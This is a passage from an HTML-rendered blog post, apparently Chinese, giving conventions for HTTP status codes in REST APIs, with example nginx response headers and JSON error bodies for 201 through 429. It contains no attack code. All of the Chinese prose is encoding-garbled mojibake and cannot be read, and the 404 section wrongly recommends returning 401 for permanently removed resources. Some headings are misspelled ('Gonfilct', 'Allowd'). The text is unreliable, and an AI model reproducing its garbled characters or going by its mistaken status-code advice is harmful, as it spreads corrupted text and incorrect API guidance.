class="line"><span class="json">    <span class="attr">&quot;id&quot;</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;avatar&quot;</span>: <span class="string">&quot;https:\/\/lorempixel.com\/640\/480\/?32556&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;nickname&quot;</span>: <span class="string">&quot;fwest&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;last_logined_time&quot;</span>: <span class="string">&quot;2018-05-29 04:56:43&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;created_at&quot;</span>: <span class="string">&quot;2018-06-16 17:55:55&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;updated_at&quot;</span>: <span class="string">&quot;2018-06-16 17:55:55&quot;</span></span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥è¿”å›ä¸€ä¸ªå“åº”å®ä½“ä¸ºç©ºçš„ HTTP Response å¦‚ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">201</span> Created</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 09:12:20 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œæˆ‘ä»¬ åº”è¯¥ é‡‡ç”¨ç¬¬äºŒç§æ–¹å¼ï¼Œå› ä¸ºå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯åªéœ€è¦çŸ¥é“è¯¥è¯·æ±‚æ“ä½œæˆåŠŸä¸å¦ï¼Œå¹¶ä¸éœ€è¦è¿”å›æ–°èµ„æºçš„ä¿¡æ¯ã€‚</p></blockquote><h3 id="202-Accepted"><a href="#202-Accepted" class="headerlink" title="202 Accepted"></a>202 Accepted</h3><p>è¯¥çŠ¶æ€ç è¡¨ç¤ºæœåŠ¡å™¨å·²ç»æ¥å—åˆ°äº†æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œä½†è¿˜æœªå¼€å§‹å¤„ç†ã€‚å¸¸ç”¨çŸ­ä¿¡å‘é€ã€é‚®ä»¶é€šçŸ¥ã€æ¨¡æ¿æ¶ˆæ¯æ¨é€ç­‰è¿™ç±»å¾ˆè€—æ—¶éœ€è¦é˜Ÿåˆ—æ”¯æŒçš„åœºæ™¯ä¸­ï¼›</p><blockquote><p>è¿”å›è¯¥çŠ¶æ€ç æ—¶ï¼Œå“åº”å®ä½“ å¿…é¡» ä¸ºç©ºã€‚</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">202</span> Accepted</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 09:25:15 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br></pre></td></tr></table></figure><h3 id="204-No-Content"><a href="#204-No-Content" class="headerlink" title="204 No Content"></a>204 No Content</h3><p>è¯¥çŠ¶æ€ç è¡¨ç¤ºå“åº”å®ä½“ä¸åŒ…å«ä»»ä½•æ•°æ®ï¼Œå…¶ä¸­ï¼š</p><p>åœ¨ä½¿ç”¨ DELETE æ–¹æ³•åˆ é™¤èµ„æº æˆåŠŸ æ—¶ï¼Œå¿…é¡» è¿”å›è¯¥çŠ¶æ€ç <br>ä½¿ç”¨ PUTã€PATCH æ–¹æ³•æ›´æ–°æ•°æ® æˆåŠŸ æ—¶ï¼Œä¹Ÿ åº”è¯¥ è¿”å›æ­¤çŠ¶æ€ç </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span> <span class="number">204</span> No Content</span><br><span class="line"><span class="attribute">Server</span>: nginx/<span class="number">1</span>.<span class="number">11</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Date</span>: Sun, <span class="number">24</span> Jun <span class="number">2018</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">12</span> GMT</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br></pre></td></tr></table></figure><h3 id="3xx-é‡å®šå‘"><a href="#3xx-é‡å®šå‘" class="headerlink" title="3xx é‡å®šå‘"></a>3xx é‡å®šå‘</h3><p>æ‰€æœ‰ API ä¸€å®šä¸å¯ è¿”å› 3xx ç±»å‹çš„çŠ¶æ€ç ã€‚å› ä¸º 3xx ç±»å‹çš„å“åº”æ ¼å¼ä¸€èˆ¬ä¸ºä¸‹åˆ—æ ¼å¼:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 09:41:50 GMT</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>https://example.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0;url=https://example.com&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Redirecting to https://example.com<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">        Redirecting to <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://example.com&quot;</span>&gt;</span>https://example.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>API ä¸€å®šä¸å¯ è¿”å›çº¯ HTML ç»“æ„çš„å“åº”ï¼›è‹¥ä¸€å®šè¦ä½¿ç”¨é‡å®šå‘åŠŸèƒ½ï¼Œåº”è¯¥ è¿”å›ä¸€ä¸ªå“åº”å®ä½“ä¸ºç©ºçš„ 3xx å“åº”ï¼Œå¹¶åœ¨å“åº”å¤´ä¸­åŠ ä¸Š Location å­—æ®µ:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 09:52:50 GMT</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>https://godruoyi.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br></pre></td></tr></table></figure><h3 id="400-Bad-Request"><a href="#400-Bad-Request" class="headerlink" title="400 Bad Request"></a>400 Bad Request</h3><p>ç”±äºæ˜æ˜¾çš„å®¢æˆ·ç«¯é”™è¯¯ï¼ˆä¾‹å¦‚ï¼Œè¯·æ±‚è¯­æ³•æ ¼å¼é”™è¯¯ã€æ— æ•ˆçš„è¯·æ±‚ã€æ— æ•ˆçš„ç­¾åç­‰ï¼‰ï¼ŒæœåŠ¡å™¨ åº”è¯¥ æ”¾å¼ƒè¯¥è¯·æ±‚ã€‚</p><blockquote><p>å½“æœåŠ¡å™¨æ— æ³•ä»å…¶ä»– 4xx ç±»å‹çš„çŠ¶æ€ç ä¸­æ‰¾å‡ºåˆé€‚çš„æ¥è¡¨ç¤ºé”™è¯¯ç±»å‹æ—¶ï¼Œéƒ½ å¿…é¡» è¿”å›è¯¥çŠ¶æ€ç ã€‚</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">400</span> Bad Request</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 13:22:36 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;error_code&quot;</span>:<span class="number">40000</span>,<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;æ— æ•ˆçš„ç­¾å&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><h3 id="401-Unauthorized"><a href="#401-Unauthorized" class="headerlink" title="401 Unauthorized"></a>401 Unauthorized</h3><p>è¯¥çŠ¶æ€ç è¡¨ç¤ºå½“å‰è¯·æ±‚éœ€è¦èº«ä»½è®¤è¯ï¼Œä»¥ä¸‹æƒ…å†µéƒ½ å¿…é¡» è¿”å›è¯¥çŠ¶æ€ç ã€‚</p><ul><li>æœªè®¤è¯ç”¨æˆ·è®¿é—®éœ€è¦è®¤è¯çš„ API</li><li>access_token æ— æ•ˆ/è¿‡æœŸ</li><li>å®¢æˆ·ç«¯åœ¨æ”¶åˆ° 401 å“åº”åï¼Œéƒ½ åº”è¯¥ æç¤ºç”¨æˆ·è¿›è¡Œä¸‹ä¸€æ­¥çš„ç™»å½•æ“ä½œã€‚</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">401</span> Unauthorized</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">WWW-Authenticate</span><span class="punctuation">: </span>JWTAuth</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 13:17:02 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="1c"><span class="string">&quot;message&quot;</span>:<span class="string">&quot;Token Signature could not be verified.&quot;</span>,<span class="string">&quot;error_code&quot;</span>: <span class="string">&quot;40100&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><h3 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h3><p>è¯¥çŠ¶æ€ç å¯ä»¥ç®€å•çš„ç†è§£ä¸ºæ²¡æœ‰æƒé™è®¿é—®è¯¥è¯·æ±‚ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ä½†æ‹’ç»æä¾›æœåŠ¡ã€‚</p><p>å¦‚å½“æ™®é€šç”¨æˆ·è¯·æ±‚æ“ä½œç®¡ç†å‘˜ç”¨æˆ·æ—¶ï¼Œå¿…é¡» è¿”å›è¯¥çŠ¶æ€ç ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">403</span> Forbidden</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 13:05:34 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;error_code&quot;</span>:<span class="number">40301</span>,<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;æƒé™ä¸è¶³&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><h3 id="404-Not-Found"><a href="#404-Not-Found" class="headerlink" title="404 Not Found"></a>404 Not Found</h3><p>è¯¥çŠ¶æ€ç è¡¨ç¤ºç”¨æˆ·è¯·æ±‚çš„èµ„æºä¸å­˜åœ¨ï¼Œå¦‚</p><ul><li>è·å–ä¸å­˜åœ¨çš„ç”¨æˆ·ä¿¡æ¯ ï¼ˆget /users/9999999ï¼‰</li><li>è®¿é—®ä¸å­˜åœ¨çš„ç«¯ç‚¹</li></ul><p>éƒ½ å¿…é¡» è¿”å›è¯¥çŠ¶æ€ç ï¼Œè‹¥è¯¥èµ„æºå·²æ°¸ä¹…ä¸å­˜åœ¨ï¼Œåˆ™ åº”è¯¥ è¿”å› 401 å“åº”ã€‚</p><h3 id="405-Method-Not-Allowd"><a href="#405-Method-Not-Allowd" class="headerlink" title="405 Method Not Allowd"></a>405 Method Not Allowd</h3><p>å½“å®¢æˆ·ç«¯ä½¿ç”¨çš„ HTTP è¯·æ±‚æ–¹æ³•ä¸è¢«æœåŠ¡å™¨å…è®¸æ—¶ï¼Œå¿…é¡» è¿”å›è¯¥çŠ¶æ€ç ã€‚</p><blockquote><p>å¦‚å®¢æˆ·ç«¯è°ƒç”¨äº† POST æ–¹æ³•æ¥è®¿é—®åªæ”¯æŒ GET æ–¹æ³•çš„ API</p></blockquote><p>è¯¥å“åº” å¿…é¡» è¿”å›ä¸€ä¸ª Allow å¤´ä¿¡æ¯ç”¨ä»¥è¡¨ç¤ºå‡ºå½“å‰èµ„æºèƒ½å¤Ÿæ¥å—çš„è¯·æ±‚æ–¹æ³•çš„åˆ—è¡¨ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">405</span> Method Not Allowed</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Allow</span><span class="punctuation">: </span>GET, HEAD</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 12:30:57 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;405 Method Not Allowed&quot;</span>,<span class="attr">&quot;error_code&quot;</span>: <span class="number">40500</span>&#125;</span></span><br></pre></td></tr></table></figure><h3 id="406-Not-Acceptable"><a href="#406-Not-Acceptable" class="headerlink" title="406 Not Acceptable"></a>406 Not Acceptable</h3><p>API åœ¨ä¸æ”¯æŒå®¢æˆ·ç«¯æŒ‡å®šçš„æ•°æ®æ ¼å¼æ—¶ï¼Œåº”è¯¥è¿”å›æ­¤çŠ¶æ€ç ã€‚å¦‚æ”¯æŒ JSON å’Œ XML è¾“å‡ºçš„ API è¢«æŒ‡å®šè¿”å› YAML æ ¼å¼çš„æ•°æ®æ—¶ã€‚</p><blockquote><p>Http åè®®ä¸€èˆ¬é€šè¿‡è¯·æ±‚é¦–éƒ¨çš„ Accept æ¥æŒ‡å®šæ•°æ®æ ¼å¼</p></blockquote><h3 id="408-Request-Timeout"><a href="#408-Request-Timeout" class="headerlink" title="408 Request Timeout"></a>408 Request Timeout</h3><p>å®¢æˆ·ç«¯è¯·æ±‚è¶…æ—¶æ—¶ å¿…é¡» è¿”å›è¯¥çŠ¶æ€ç ï¼Œéœ€è¦æ³¨æ„çš„æ—¶ï¼Œè¯¥çŠ¶æ€ç è¡¨ç¤º å®¢æˆ·ç«¯è¯·æ±‚è¶…æ—¶ï¼Œåœ¨æ¶‰åŠç¬¬ä¸‰æ–¹ API è°ƒç”¨è¶…æ—¶æ—¶ï¼Œä¸€å®šä¸å¯ è¿”å›è¯¥çŠ¶æ€ç ã€‚</p><h3 id="409-Gonfilct"><a href="#409-Gonfilct" class="headerlink" title="409 Gonfilct"></a>409 Gonfilct</h3><p>è¯¥çŠ¶æ€ç è¡¨ç¤ºå› ä¸ºè¯·æ±‚å­˜åœ¨å†²çªæ— æ³•å¤„ç†ã€‚å¦‚é€šè¿‡æ‰‹æœºå·ç æä¾›æ³¨å†ŒåŠŸèƒ½çš„ APIï¼Œå½“ç”¨æˆ·æäº¤çš„æ‰‹æœºå·å·²å­˜åœ¨æ—¶ï¼Œå¿…é¡» è¿”å›æ­¤çŠ¶æ€ç ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">409</span> Conflict</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 12:19:04 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;error_code&quot;</span>:<span class="number">40900</span>,<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;æ‰‹æœºå·å·²å­˜åœ¨&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><h3 id="410-Gone"><a href="#410-Gone" class="headerlink" title="410 Gone"></a>410 Gone</h3><p>å’Œ 404 ç±»ä¼¼ï¼Œè¯¥çŠ¶æ€ç ä¹Ÿè¡¨ç¤ºè¯·æ±‚çš„èµ„æºä¸å­˜åœ¨ï¼Œåªæ˜¯ 410 çŠ¶æ€ç è¿›ä¸€æ­¥è¡¨ç¤ºæ‰€è¯·æ±‚çš„èµ„æºå·²ä¸å­˜åœ¨ï¼Œå¹¶ä¸”æœªæ¥ä¹Ÿä¸ä¼šå­˜åœ¨ã€‚åœ¨æ”¶åˆ° 410 çŠ¶æ€ç åï¼Œå®¢æˆ·ç«¯ åº”è¯¥ åœæ­¢å†æ¬¡è¯·æ±‚è¯¥èµ„æºã€‚</p><h3 id="413-Request-Entity-Too-Large"><a href="#413-Request-Entity-Too-Large" class="headerlink" title="413 Request Entity Too Large"></a>413 Request Entity Too Large</h3><p>è¯¥çŠ¶æ€ç è¡¨ç¤ºæœåŠ¡å™¨æ‹’ç»å¤„ç†å½“å‰è¯·æ±‚ï¼Œå› ä¸ºè¯¥è¯·æ±‚æäº¤çš„å®ä½“æ•°æ®å¤§å°è¶…è¿‡äº†æœåŠ¡å™¨æ„¿æ„æˆ–è€…èƒ½å¤Ÿå¤„ç†çš„èŒƒå›´ã€‚</p><blockquote><p>æ­¤ç§æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨å¯ä»¥å…³é—­è¿æ¥ä»¥å…å®¢æˆ·ç«¯ç»§ç»­å‘é€æ­¤è¯·æ±‚ã€‚</p></blockquote><p>å¦‚æœè¿™ä¸ªçŠ¶å†µæ˜¯ä¸´æ—¶çš„ï¼ŒæœåŠ¡å™¨ åº”è¯¥ è¿”å›ä¸€ä¸ª Retry-After çš„å“åº”å¤´ï¼Œä»¥å‘ŠçŸ¥å®¢æˆ·ç«¯å¯ä»¥åœ¨å¤šå°‘æ—¶é—´ä»¥åé‡æ–°å°è¯•ã€‚</p><h3 id="414-Request-URI-Too-Long"><a href="#414-Request-URI-Too-Long" class="headerlink" title="414 Request-URI Too Long"></a>414 Request-URI Too Long</h3><p>è¯¥çŠ¶æ€ç è¡¨ç¤ºè¯·æ±‚çš„ URI é•¿åº¦è¶…è¿‡äº†æœåŠ¡å™¨èƒ½å¤Ÿè§£é‡Šçš„é•¿åº¦ï¼Œå› æ­¤æœåŠ¡å™¨æ‹’ç»å¯¹è¯¥è¯·æ±‚æä¾›æœåŠ¡ã€‚</p><h3 id="415-Unsupported-Media-Type"><a href="#415-Unsupported-Media-Type" class="headerlink" title="415 Unsupported Media Type"></a>415 Unsupported Media Type</h3><p>é€šå¸¸è¡¨ç¤ºæœåŠ¡å™¨ä¸æ”¯æŒå®¢æˆ·ç«¯è¯·æ±‚é¦–éƒ¨ Content-Type æŒ‡å®šçš„æ•°æ®æ ¼å¼ã€‚å¦‚åœ¨åªæ¥å— JSON æ ¼å¼çš„ API ä¸­æ”¾å…¥ XML ç±»å‹çš„æ•°æ®å¹¶å‘æœåŠ¡å™¨å‘é€ï¼Œéƒ½ åº”è¯¥ è¿”å›è¯¥çŠ¶æ€ç ã€‚</p><p>è¯¥çŠ¶æ€ç ä¹Ÿå¯ç”¨äºå¦‚ï¼šåªå…è®¸ä¸Šä¼ å›¾ç‰‡æ ¼å¼çš„æ–‡ä»¶ï¼Œä½†æ˜¯å®¢æˆ·ç«¯æäº¤åª’ä½“æ–‡ä»¶éæ³•æˆ–ä¸æ˜¯å›¾ç‰‡ç±»å‹ï¼Œè¿™æ—¶ åº”è¯¥ è¿”å›è¯¥çŠ¶æ€ç ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">415</span> Unsupported Media Type</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 12:09:40 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;error_code&quot;</span>:<span class="number">41500</span>,<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;ä¸å…è®¸ä¸Šä¼ çš„å›¾ç‰‡æ ¼å¼&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><h3 id="429-Too-Many-Request"><a href="#429-Too-Many-Request" class="headerlink" title="429 Too Many Request"></a>429 Too Many Request</h3><p>è¯¥çŠ¶æ€ç è¡¨ç¤ºç”¨æˆ·è¯·æ±‚æ¬¡æ•°è¶…è¿‡å…è®¸èŒƒå›´ã€‚å¦‚ API è®¾å®šä¸º 60æ¬¡/åˆ†é’Ÿï¼Œå½“ç”¨æˆ·åœ¨ä¸€åˆ†é’Ÿå†…è¯·æ±‚æ¬¡æ•°è¶…è¿‡ 60 æ¬¡åï¼Œéƒ½ åº”è¯¥ è¿”å›è¯¥çŠ¶æ€ç ã€‚å¹¶ä¸”ä¹Ÿ åº”è¯¥ åœ¨å“åº”é¦–éƒ¨ä¸­åŠ ä¸Šä¸‹åˆ—å¤´éƒ¨ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X</span>-RateLimit-Limit: <span class="number">10</span> è¯·æ±‚é€Ÿç‡ï¼ˆç”±åº”ç”¨è®¾å®šï¼Œå…¶å•ä½ä¸€èˆ¬ä¸ºå°æ—¶/åˆ†é’Ÿç­‰ï¼Œè¿™é‡Œæ˜¯ <span class="number">10</span>æ¬¡/<span class="number">5</span>åˆ†é’Ÿï¼‰</span><br><span class="line"><span class="attribute">X</span>-RateLimit-Remaining: <span class="number">0</span> å½“å‰å‰©ä½™çš„è¯·æ±‚æ•°é‡</span><br><span class="line"><span class="attribute">X</span>-RateLimit-Reset: <span class="number">1529839462</span> é‡ç½®æ—¶é—´</span><br><span class="line"><span class="attribute">Retry</span>-After: <span class="number">120</span> ä¸‹ä¸€æ¬¡è®¿é—®åº”è¯¥ç­‰å¾…çš„æ—¶é—´ï¼ˆç§’ï¼‰</span><br></pre></td></tr></table></figure><p>åˆ—å­</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">429</span> Too Many Requests</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">X-RateLimit-Limit</span><span class="punctuation">: </span>10</span><br><span class="line"><span class="attribute">X-RateLimit-Remaining</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">X-RateLimit-Reset</span><span class="punctuation">: </span>1529839462</span><br><span class="line"><span class="attribute">Retry-After</span><span 